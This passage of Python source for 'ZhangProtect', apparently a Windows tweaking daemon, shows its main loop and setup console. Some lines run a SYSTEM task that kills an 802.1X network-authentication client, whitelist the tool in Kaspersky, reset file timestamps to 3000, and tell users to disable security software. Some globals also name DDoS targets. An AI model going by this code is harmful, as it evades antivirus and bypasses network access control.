                    for i in list(psutil.net_if_addrs().keys()):
                        RunWrapper(
                            'netsh interface ipv4 set interface "'
                            + str(i)
                            + '" metric=1'
                        )
                        RunWrapper(
                            'netsh interface ipv6 set interface "'
                            + str(i)
                            + '" metric=1'
                        )
            except:
                pass
            try:
                RunWrapper('regedit /s "' + RDPreg + '"')
            except:
                pass
            RunWrapper(
                "powershell \"Get-Childitem -path '%s' -Recurse | foreach-object { $_.LastWriteTime ='01/01/3000 00:00:00' ; $_.CreationTime = '01/01/3000 00:00:00'; $_.LastWriteTime = '01/01/3000 00:00:00'  } 2>$null\""
                % ProtectDir
            )
            RunWrapper("sc delete DusmSvc")
            if os.path.isfile(RemoveChangeMAC) and os.path.isfile(AutoChangeMAC):
                try:
                    os.remove(AutoChangeMAC)
                except:
                    pass
            if os.path.isfile(RemoveChangeMAC):
                RunWrapper(
                    "for /f \"delims=\" %i in ('reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}') do (reg delete %i /v NetworkAddress /f)"
                )
            RunWrapper("taskkill /f /im ACE-Tray.exe /t")
            if os.path.isfile(fuck_8021x):
                Create_Schtasks(
                    "Fuck8021X",
                    "cmd",
                    "/c ping -n 1 www.baidu.com && taskkill /f /im 8021x.exe /t && taskkill /f /im suservice.exe /t",
                    "SYSTEM",
                    1,
                )
            else:
                RunWrapper("schtasks /Delete /F /tn ZhangProtect\\Fuck8021X")
            RunWrapper(
                'reg add %s\\%s\\command /f /d "%s"'
                % (
                    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell",
                    "断开RDP连接且保持程序运行",
                    "cmd /c for /f \\\"delims=\\\" %%i in ('powershell $env:UserName') do (for /f \\\"skip=1 tokens=3\\\" %%s in ('query user %%i') do (tscon.exe %%s /dest:console) & timeout /t 5)",
                )
            ).read()
            if os.path.isfile(ShowSecondsInSystemClock):
                if os.path.isfile(do_no_show_clock_info) or os.path.isfile(
                    user_show_clock_info
                ):
                    ShowSecondsInSystemClock_flag = 0
                else:
                    ShowSecondsInSystemClock_flag = 1
            else:
                ShowSecondsInSystemClock_flag = 0
            reg_reader.reg_write(
                "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                "ShowSecondsInSystemClock",
                "reg_dword",
                ShowSecondsInSystemClock_flag,
            )
            reg_reader.reg_write(
                "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
                "ShowSecondsInSystemClock",
                "reg_dword",
                ShowSecondsInSystemClock_flag,
            )
            # 蓝牙绝对音量
            BT_DisableAbsoluteVolume_flag = 1
            if os.path.isfile(BT_DisableAbsoluteVolume):
                BT_DisableAbsoluteVolume_flag = 1
            else:
                BT_DisableAbsoluteVolume_flag = 0
            reg_reader.reg_write(
                "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Bluetooth\\Audio\\AVRCP\\CT",
                "DisableAbsoluteVolume",
                "reg_dword",
                BT_DisableAbsoluteVolume_flag,
            )
            try:
                if os.path.isfile(force_out_files):
                    os.remove(force_out_files)
            except:
                pass
            try:
                protect_self_process()
            except:
                pass
            if os.path.isfile(AutoClearJetBrainsHistory):
                try:
                    clear_JetBrains_History()
                except:
                    pass
            if os.path.isfile(use_storage_redirect):
                StorageRedirect(datadir, SystemDir[0])
            try:
                create_kaspersky_whitelist(datadir, SystemDir[0])
            except:
                pass
            if os.path.isfile(use_file_arrange):
                file_arrange(f"{datadir}:", SystemDir)
            try:
                set_exe_runas_admin(ProtectDir)
            except:
                pass
            try:
                print("[Debug]", should_broadcast_environment_change())
                if should_broadcast_environment_change():
                    broadcast_environment_change()
                    should_broadcast_environment_change(True)
            except:
                pass
            if os.path.isfile(RemoveICONArrow):
                reg_reader.reg_write(
                    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons",
                    "29",
                    "REG_SZ",
                    TransparentIcon,
                )
            else:
                reg_reader.reg_delete_key(
                    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons",
                    "29",
                )
            if not os.path.isfile(ls_bat):
                with smart_open.smart_opens(ls_bat, "w") as f:
                    f.write("@echo off\ndir /A /B")
            if os.path.isfile(pause_on_game_flag):
                os.remove(pause_on_game_flag)
            try:
                rename_if_user_equals_computer()
            except:
                pass
            try:
                fuck_update()
            except:
                pass
            try:
                change_ccleaner_ini(CCleanerIni)
            except:
                pass

            try:

                set_BLESync_storage_path(
                    BLESync_ini, f"{datadir}:\\StorageRedirect\\Data\\BLESyncData"
                )
            except:
                pass

            try:
                if is_connected_network():
                    no_network_run_flag = False
                    no_network_run_num = 0
                else:
                    no_network_run_num += 1
                    if not no_network_run_flag:
                        if os.path.isfile(Run_on_no_network):
                            if runas("SYSTEM", Run_on_no_network):
                                no_network_run_flag = True
                        else:
                            with smart_open.smart_opens(Run_on_no_network, "w") as f:
                                f.write(
                                    f'rem 此批处理将在检测到断网时以SYSTEM身份运行\nrem 默认以SYSTEM用户执行，如需使用其他用户执行，请使用命令行[runas_user.exe]，具体参数详见["{runas_user_exe}" /h]'
                                )
                    else:
                        if no_network_run_num >= 3:
                            no_network_run_num = 0
                            no_network_run_flag = False
            except:
                no_network_run_flag = False
            try:
                if not os.path.isfile(run_on_Power_Troubleshooter_bat):
                    with smart_open.smart_opens(
                        run_on_Power_Troubleshooter_bat, "w"
                    ) as f:
                        f.write(
                            f'rem 此批处理将在系统唤醒时以SYSTEM身份运行\nrem 默认以SYSTEM用户执行，如需使用其他用户执行，请使用命令行[runas_user.exe]，具体参数详见["{runas_user_exe}" /h]'
                        )
            except:
                pass
            AutoScreenshot_lock_ini_config(
                AutoScreenshot_ini, datadir + ":\\Files\\Data\\AutoScreenshot"
            )
            try:
                if not os.path.isfile(WLANSVC_Redirect_Tips):
                    with smart_open.smart_opens(WLANSVC_Redirect_Tips, "w") as f:
                        f.write(
                            f"本程序默认为您重定向WlanSvc数据目录以便在还原环境下持久化保存WiFi信息,但需要您手动通过DataLgloo重定向部分注册表信息到解冻目录(建议:{datadir + ":\\StorageRedirect\\Registry"}):\nHKLM\\SOFTWARE\\Microsoft\\WlanSvc\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList"
                        )
            except:
                pass
            RunWrapper("title ZhangProtect")
            gc.collect()
            sleep_time = 60
            logger.log(
                "主线程第 " + str(WhileNum) + f" 次循环正常,暂停 {sleep_time} 秒",
            )
            time.sleep(sleep_time)
            # 好啦,到这里结束了~
        except Exception as e:
            logger.log(
                "抛出错误在循环阶段,将重新运行该部分"
                + str(sys.exc_info())
                + "行:"
                + str(e.__traceback__.tb_lineno),
            )
        time.sleep(10)


def starter():
    while True:
        try:
            returnflag = reading_ini()
            if returnflag == "reload":
                raise Exception("reload")
            if not qinstall:
                flagtest()
            define()
            pope()
            while True:
                application()
                time.sleep(10)
        except Exception as e:
            logger.log(
                "抛出错误在主函数,将重新运行该部分"
                + str(sys.exc_info())
                + "行:"
                + str(e.__traceback__.tb_lineno),
            )
        time.sleep(10)


def main():
    global testflag, qinstall, setflag, ikun_wav_file, _process_list_cache, update_application, show_control, ZhangProtectPauseFlag, update_application
    sys.stderr = open(os.devnull, "w")  # 去除管道错误
    inputs = sys.argv
    if len(inputs) == 1:
        if not debug_mode:
            hide_console()
    try:
        if not debug_mode:
            os.chdir(os.path.dirname(sys.executable))
        else:
            logger.log(f"调试模式,已切换工作目录到{ProtectDir}")
            os.chdir(ProtectDir)
        disable_quick_edit_mode()
    except Exception as e:
        logger.log(f"致命错误:{e}")
        time.sleep(10)
        exit(0)
    tools_info = "ZhangProtect"
    qinstall = False
    update_application = False
    show_control = False
    if len(inputs) == 2:
        try:
            if inputs[1] == "-t" or inputs[1] == "/t":
                config.is_testflag = True
                logger.log("已进入调试模式,显示控制台窗口,将会显示运行信息")
            elif inputs[1] == "-h" or inputs[1] == "/h" or inputs[1] == "/?":
                tags_info = ""
                for i in config_tags:
                    tags_info += chr(10) + i[0] + " - " + i[1]
                messagebox.showinfo(
                    "命令帮助",
                    "命令帮助:"
                    + chr(10)
                    + "-t 调试模式"
                    + chr(10)
                    + "-q 静默安装(使用默认配置)"
                    + chr(10)
                    + "-u 更新程序(更新为当前可执行文件版本)"
                    + chr(10)
                    + "-c 打开程序控制台"
                    + chr(10)
                    + chr(10)
                    + "软件版本:"
                    + version,
                )
                exit(0)
            elif inputs[1] == "-q" or inputs[1] == "/q":
                qinstall = True
            elif inputs[1] == "-u" or inputs[1] == "/u":
                update_application = True
            elif inputs[1] == "-c" or inputs[1] == "/c":
                show_control = True
            else:
                if not debug_mode:
                    config.is_testflag = False
                qinstall = False
                update_application = False
                show_control = False
        except Exception as e:
            exit(0)
    global testflag
    testflag = config.is_test_mode()
    if os.path.isfile("ZhangProtectLock"):
        logger.log("该目录不允许运行，正在退出。")
        exit(0)
    logger.log("系统位置:%s" % WindowsDir)
    logger.log("缓存位置:%s" % TempDir)
    logger.log("系统版本:%s" % SystemVersion)
    try:
        os.chdir(ProtectDir)
    except Exception as e:
        pass
    try:
        if not len(inputs) == 2:
            proc_flag = 0
            i: int
            for i in psutil.pids():  # 只允许运行一个优化程序进程
                try:
                    proc = psutil.Process(i)
                    execs = proc.exe()
                    commandline = proc.cmdline()
                    if execs == selffullname and len(commandline) == 1:
                        if not i == os.getpid():
                            proc_flag += 1
                except Exception as e:
                    pass
            if proc_flag >= 2:
                exit(0)
    except:
        pass
    ikun_wav_file = WindowsDir + "\\iKun_Sound.wav"
    try:
        os.chdir(ProtectDir)
    except Exception as e:
        pass
    ZhangProtectPauseFlag = False
    if update_application:
        application_update()
        exit(0)
    # 配置标志
    setflag = True
    # 判断管理员权限
    if not testflag:
        try:
            if (
                not selffullname == ProtectExe or not os.path.isfile(ProtectExe)
            ) and not debug_mode:

                def is_admin():
                    try:
                        return ctypes.windll.shell32.IsUserAnAdmin()
                    except Exception as e:
                        return False

                install_runas_flag_user = False
                if qinstall and not is_admin():
                    install_runas_flag_user = messagebox.askyesno(
                        "警告:静默安装失败", "静默安装失败,需要提升的权限,是否尝试提升?"
                    )
                elif not is_admin():
                    install_runas_flag_user = messagebox.askyesno(
                        "警告", "无法获取权限,需要提升的权限,是否尝试提升?"
                    )
                try:
                    if install_runas_flag_user and not is_admin():
                        if qinstall:
                            ctypes.windll.shell32.ShellExecuteW(
                                None, "runas", sys.executable, "-q", None, 1
                            )
                        else:
                            ctypes.windll.shell32.ShellExecuteW(
                                None, "runas", sys.executable, "", None, 1
                            )
                        exit(0)
                    elif not is_admin():
                        exit(0)
                except Exception as e:
                    messagebox.showerror("提升失败", "请手动右键以管理员身份运行")
        except Exception as e:
            exit(0)
    # 初始化并写入配置文件
    try:
        if (
            (not selffullname == ProtectExe)
            or (not os.path.isfile(ProtectExe))
            or (show_control)
        ) and not debug_mode:
            if not selffullname == ProtectExe:
                logger.log(
                    "运行路径(%s)与安装路径(%s)不符,打开控制台"
                    % (selffullname, ProtectExe),
                )
            if not os.path.isfile(ProtectExe):
                logger.log("程序未安装,打开控制台")
            if show_control:
                logger.log("用户打开控制台")
            setpriority(os.getpid(), 3)
            setflag = False
            if not qinstall:
                MsgText = (
                    "程序配置控制台"
                    + chr(10)
                    + "请退出安全软件并关闭安全中心实时保护"
                    + chr(10)
                    + "是 --> 安装/更新 否 --> 卸载"
                    + chr(10)
                    + "命令行 -h 显示命令帮助"
                    + chr(10)
                    + tools_info
                    + chr(10)
                    + "软件版本:"
                    + version
                )
                if not show_control:
                    UserBackTell = messagebox.askyesnocancel("GUI控制台", MsgText)
                else:
                    UserBackTell = True
                if UserBackTell == True or show_control:
                    makestart()
                    # 创建GUI对话框完成参数输入
                    root = tk.Tk()
                    root.attributes("-topmost", 1)  # 窗口置顶显示
                    root.title("ZhangProtect控制台")
                    icon = "icon.ico"
                    try:
                        if not os.path.isfile(icon):
                            get_pic(icon_ico, "icon.ico")
                        if os.path.isfile(icon):
                            root.iconbitmap(icon)
                            os.remove(icon)
                    except:
                        pass
                    label1 = tk.Label(
                        root, text="第一个守护进程名" + chr(10) + "(非提升运行)"
                    )
                    label1.grid(row=0, column=0)
                    label2 = tk.Label(
                        root, text="第一个守护启动命令" + chr(10) + "(非提升运行)"
                    )
                    label2.grid(row=1, column=0)
                    label3 = tk.Label(
                        root, text="第二个守护进程名" + chr(10) + "(提升运行)"
                    )
                    label3.grid(row=2, column=0)
                    label4 = tk.Label(
                        root, text="第二个守护启动命令" + chr(10) + "(提升运行)"
                    )
                    label4.grid(row=3, column=0)
                    label5 = tk.Label(root, text="自动执行" + chr(10) + "(提升运行)")
                    label5.grid(row=4, column=0)
                    label6 = tk.Label(root, text="数据盘驱动器盘符")
                    label6.grid(row=5, column=0)
                    label7 = tk.Label(root, text="定期写入目录诱导同步")
                    label7.grid(row=6, column=0)
                    label8 = tk.Label(
                        root,
                        text="自动关机/休眠/重启时间"
                        + chr(10)
                        + "(时间格式xx:xx末尾加r重启)"
                        + chr(10)
                        + "(多个时间用*隔开,完整功能)",
                    )
                    label8.grid(row=7, column=0)
                    label9 = tk.Label(
                        root, text="高级功能开关" + chr(10) + "(输入1为开)"
                    )
                    label9.grid(row=8, column=0)
                    label10 = tk.Label(
                        root,
                        text="移动热点信息"
                        + chr(10)
                        + "格式>SSID*密码*频段 "
                        + chr(10)
                        + "频段:0->Auto;1->2.4G;2->5.0G",
                    )
                    label10.grid(row=9, column=0)
                    label11 = tk.Label(
                        root,
                        text="扫描目标IPv4地址(弃用)",
                    )
                    label11.grid(row=10, column=0)
                    # 创建输入框
                    entry1 = tk.Entry(root)
                    entry1.grid(row=0, column=1, padx=10, pady=5)
                    entry2 = tk.Entry(root)
                    entry2.grid(row=1, column=1, padx=10, pady=5)
                    entry3 = tk.Entry(root)
                    entry3.grid(row=2, column=1, padx=10, pady=5)
                    entry4 = tk.Entry(root)
                    entry4.grid(row=3, column=1, padx=10, pady=5)
                    entry5 = tk.Entry(root)
                    entry5.grid(row=4, column=1, padx=10, pady=5)
                    entry6 = tk.Entry(root)
                    entry6.grid(row=5, column=1, padx=10, pady=5)
                    entry7 = tk.Entry(root)
                    entry7.grid(row=6, column=1, padx=10, pady=5)
                    entry8 = tk.Entry(root)
                    entry8.grid(row=7, column=1, padx=10, pady=5)
                    entry9 = tk.Entry(root)
                    entry9.grid(row=8, column=1, padx=10, pady=5)
                    entry10 = tk.Entry(root)
                    entry10.grid(row=9, column=1, padx=10, pady=5)
                    entry11 = tk.Entry(root)
                    entry11.grid(row=10, column=1, padx=10, pady=5)
                    try:
                        if os.path.isfile(Protectconf):
                            inilong = 11  # 配置文件长度(输入框数量,修改的时候下面readini函数里的也要改)
                            with smart_open.smart_opens(
                                Protectconf,
                                "r",
                            ) as f:
                                a = f.read()
                                oldconf = a.splitlines()[:inilong]
                            entry1.insert(0, oldconf[0])
                            entry2.insert(0, oldconf[1])
                            entry3.insert(0, oldconf[2])
                            entry4.insert(0, oldconf[3])
                            entry5.insert(0, oldconf[4])
                            entry6.insert(0, oldconf[5])
                            entry7.insert(0, oldconf[6])
                            entry8.insert(0, oldconf[7])
                            entry9.insert(0, oldconf[8])
                            entry10.insert(0, oldconf[9])
                            entry11.insert(0, oldconf[10])
                    except Exception as e:
                        entry1.delete(0, "end")
                        entry2.delete(0, "end")
                        entry3.delete(0, "end")
                        entry4.delete(0, "end")
                        entry5.delete(0, "end")
                        entry6.delete(0, "end")
                        entry7.delete(0, "end")
                        entry8.delete(0, "end")
                        entry9.delete(0, "end")
                        entry10.delete(0, "end")
                        entry11.delete(0, "end")

                    # 写入配置文件
                    def show():
                        global setflag, qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, UserBackA, UserBackB, UserBackC, UserBackD, UserBackE, UserBackF, UserBackG, UserBackH
                        setflag = True
                        try:
                            UserBackA = entry1.get()
                            UserBackB = entry2.get()
                            UserBackC = entry3.get()
                            UserBackD = entry4.get()
                            UserBackE = entry5.get()
                            UserBackF = entry6.get()
                            UserBackG = entry7.get()
                            UserBackH = entry8.get()
                            UserBackI = entry9.get()
                            UserBackJ = entry10.get()
                            UserBackK = entry11.get()
                            writing_conf(
                                qinstall,
                                UserBackA,
                                UserBackB,
                                UserBackC,
                                UserBackD,
                                UserBackE,
                                UserBackF,
                                UserBackG,
                                UserBackH,
                                UserBackI,
                                UserBackJ,
                                UserBackK,
                            )
                            if show_control:
                                exit(0)
                        except Exception as e:
                            messagebox.showerror(
                                "失败",
                                "配置失败"
                                + chr(10)
                                + "请检查错误码并重试"
                                + chr(10)
                                + str(sys.exc_info())
                                + "行:"
                                + str(e.__traceback__.tb_lineno),
                            )
                            exit(0)

                    def finish():
                        application_install()
                        exit(0)

                    def update():
                        application_update()
                        messagebox.showinfo(
                            "完成",
                            "ZhangProtect安装完毕" + chr(10) + "重启计算机以完成更改",
                        )
                        exit(0)

                    def out():
                        messagebox.showinfo(
                            "警告",
                            "请仅在程序出现问题时使用此按钮"
                            + chr(10)
                            + "由此退出程序时不会撤销任何已应用的更改",
                        )
                        exit(0)

                    tk.Button(
                        root,
                        text="保存配置" + chr(10) + "(若存在空值将使用默认值)",
                        command=show,
                    ).grid(row=11, column=0, sticky=tk.E, padx=30, pady=5)
                    if not show_control:
                        tk.Button(
                            root,
                            text="更新程序" + chr(10) + "(保留原有配置文件不修改)",
                            command=update,
                        ).grid(row=11, column=1, sticky=tk.E, padx=30, pady=5)
                        tk.Button(
                            root,
                            text="安装程序" + chr(10) + "(请先点击保存或更新程序)",
                            command=finish,
                        ).grid(row=12, column=0, sticky=tk.E, padx=30, pady=5)
                        tk.Button(
                            root,
                            text="强制退出" + chr(10) + "(仅在程序出现问题时单击)",
                            command=out,
                        ).grid(row=12, column=1, sticky=tk.E, padx=30, pady=5)
                    center_window(root, 440, 560)
                    tk.mainloop()
                elif UserBackTell == False:
                    try:
                        if not os.path.isfile(UNINST):
                            messagebox.showinfo(
                                "出错", "卸载批处理文件不存在!请运行主程序一次来生成"
                            )
                            exit(0)
                        for i in psutil.process_iter():  # 查找正在运行的进程
                            if str(i.name()) == "Protect.exe":
                                pid = i.pid
                                proc = psutil.Process(pid)
                                if str(proc.exe()) == ProtectExe:
                                    # 必须结束已经运行的进程才能卸载
                                    RunWrapper(
                                        "cmd /c taskkill /f /t /pid "
                                        + str(pid)
                                        + ' & powershell "Stop-Process -Force '
                                        + str(pid)
                                        + '">nul 2>nul'
                                    )
                        RunWrapper(
                            'cmd /c taskkill /f /im cmd.exe /t & powershell "Get-Process -Name cmd | Stop-Process -Force" >nul 2>nul'
                        ).read()
                        RunWrapper(
                            'cmd /c taskkill /f /im powershell.exe /t & powershell "Get-Process -Name powershell | Stop-Process -Force" >nul 2>nul'
                        ).read()
                        # 先删除主程序然后Uninstall
                        os.remove(ProtectExe)
                        RunWrapper(
                            "cmd /c start /b cmd /c " + chr(34) + UNINST + chr(34)
                        )
                        RunWrapper("cmd /c shutdown -r -t 30")
                        messagebox.showinfo(
                            "完成",
                            "已执行卸载,如未正确完成卸载,请手动以管理员身份运行"
                            + chr(10)
                            + UNINST
                            + chr(10)
                            + "重启计算机完成卸载"
                            + chr(10)
                            + "注意:卸载本程序不会还原之前做的更改",
                        )
                        exit(0)
                    except Exception as e:
                        messagebox.showerror(
                            "失败",
                            "配置失败"
                            + chr(10)
                            + "请检查程序状态并确保已关闭安全软件,或手动执行操作"
                            + chr(10)
                            + str(sys.exc_info())
                            + "行:"
                            + str(e.__traceback__.tb_lineno),
                        )
                        exit(0)
                else:
                    messagebox.showinfo("已终止", "已取消所有操作")
                    exit(0)
            else:
                makestart()
                writing_conf(qinstall)
                application_install()
                exit(0)
    except Exception as e:
        messagebox.showinfo(
            "错误",
            "程序出现错误将退出"
            + str(sys.exc_info())
            + "行:"
            + str(e.__traceback__.tb_lineno),
        )
        exit(0)
    # 运行主逻辑启动器
    starter()


if __name__ == "__main__":
    main()
